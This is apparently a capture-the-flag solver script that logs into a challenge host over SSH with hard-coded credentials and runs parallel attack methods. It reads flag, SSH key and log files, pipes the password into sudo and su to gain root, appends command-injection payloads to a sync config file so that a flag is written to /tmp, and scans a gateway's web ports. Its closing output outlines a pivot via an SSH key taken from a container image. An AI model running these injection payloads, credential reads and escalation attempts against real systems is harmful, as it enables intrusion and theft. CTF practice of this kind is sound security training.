#!/usr/bin/env python3
"""
LAST CHANCE - Try everything simultaneously
"""
import paramiko
import threading

HOST = "instance.ctf.tdho.st"
PORT = 32881
USERNAME = "player"
PASSWORD = "reyalp"

flag_found = threading.Event()
flag_value = []

def ssh_connect():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
    return client

def exec_cmd(client, cmd):
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=15)
        return stdout.read().decode() + stderr.read().decode()
    except:
        return ""

def method1_check_everything():
    """Check every possible location"""
    if flag_found.is_set():
        return
    
    client = ssh_connect()
    locations = [
        "cat /etc/flag.txt",
        "cat /flag.txt",
        "cat /root/flag.txt", 
        "cat /opt/flag.txt",
        "cat /opt/mc/flag.txt",
        "cat /home/*/flag.txt",
        "cat /tmp/flag*",
        "cat ~/.ssh/authorized_keys",  # Might have hints
        "cat /opt/mc/.sync/*",
        "tail -100 /var/log/* 2>/dev/null | grep TDHT",
        "env | grep FLAG",
        "printenv | grep TDHT"
    ]
    
    for loc in locations:
        out = exec_cmd(client, loc)
        if "TDHT{" in out:
            print(f"\n🚩 FLAG FOUND: {out}")
            flag_value.append(out)
            flag_found.set()
            return
    client.close()

def method2_try_root_shell():
    """Try to get root via any means"""
    if flag_found.is_set():
        return
    
    client = ssh_connect()
    
    # Try sudo
    out = exec_cmd(client, f"echo '{PASSWORD}' | sudo -S cat /etc/flag.txt 2>&1")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG via sudo: {out}")
        flag_value.append(out)
        flag_found.set()
        return
    
    # Try su
    out = exec_cmd(client, f"(echo '{PASSWORD}'; echo 'cat /etc/flag.txt') | su 2>&1")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG via su: {out}")
        flag_value.append(out)
        flag_found.set()
        return
    
    client.close()

def method3_exploit_sync():
    """Try to exploit sync with different payloads"""
    if flag_found.is_set():
        return
    
    client = ssh_connect()
    
    # Try different exploit patterns
    exploits = [
        'exec=`cat /etc/flag.txt`',
        'flag=$(cat /etc/flag.txt)',
        '$(cat /etc/flag.txt > /tmp/stolen_flag)',
        '; cat /etc/flag.txt > /tmp/f;',
        '| cat /etc/flag.txt',
        '&& cat /etc/flag.txt',
    ]
    
    for exploit in exploits:
        exec_cmd(client, f"echo '{exploit}' >> /opt/mc/config/sync-request.conf")
    
    import time
    time.sleep(5)
    
    # Check outputs
    out = exec_cmd(client, "cat /tmp/stolen_flag /tmp/f 2>/dev/null")
    if "TDHT{" in out:
        print(f"\n🚩 FLAG via sync exploit: {out}")
        flag_value.append(out)
        flag_found.set()
        return
    
    client.close()

def method4_check_ssh_config():
    """Maybe there's a key or config hint"""
    if flag_found.is_set():
        return
    
    client = ssh_connect()
    
    # Check SSH config
    out = exec_cmd(client, "cat ~/.ssh/config /etc/ssh/ssh_config 2>/dev/null")
    print(f"SSH Config: {out[:500]}")
    
    # Check for any existing keys
    out = exec_cmd(client, "ls -la ~/.ssh/")
    print(f"SSH dir: {out}")
    
    # Check known_hosts
    out = exec_cmd(client, "cat ~/.ssh/known_hosts 2>/dev/null")
    if "172.27.0.1" in out:
        print(f"Known hosts has gateway: {out}")
    
    client.close()

def method5_check_web_on_gateway():
    """Use wget to check web on gateway"""
    if flag_found.is_set():
        return
    
    client = ssh_connect()
    
    gateway = "172.27.0.1"
    paths = ["/", "/flag", "/flag.txt", "/admin", "/secret", "/api/flag"]
    
    for port in [80, 8080]:
        for path in paths:
            out = exec_cmd(client, f"wget -q -O- --timeout=2 http://{gateway}:{port}{path} 2>&1")
            if "TDHT{" in out:
                print(f"\n🚩 FLAG from web {port}{path}: {out}")
                flag_value.append(out)
                flag_found.set()
                return
    
    client.close()

def main():
    print("[*] LAST CHANCE - All methods simultaneously")
    print("[*] Time remaining: ~1-2 minutes\n")
    
    threads = [
        threading.Thread(target=method1_check_everything),
        threading.Thread(target=method2_try_root_shell),
        threading.Thread(target=method3_exploit_sync),
        threading.Thread(target=method4_check_ssh_config),
        threading.Thread(target=method5_check_web_on_gateway),
    ]
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join(timeout=45)
    
    if flag_found.is_set():
        print(f"\n{'='*60}")
        print(f"SUCCESS! FLAG: {flag_value[0]}")
        print(f"{'='*60}")
    else:
        print("\n[!] FLAG NOT FOUND")
        print("\nThe solution requires:")
        print("1. Finding the public GHCR image (e.g., ghcr.io/talldwarfhosting/mc-server:v1)")
        print("2. Extracting SSH key from that image")
        print("3. Using that key to SSH to 172.27.0.1")
        print("4. cat /etc/flag.txt on the gateway")

if __name__ == "__main__":
    main()
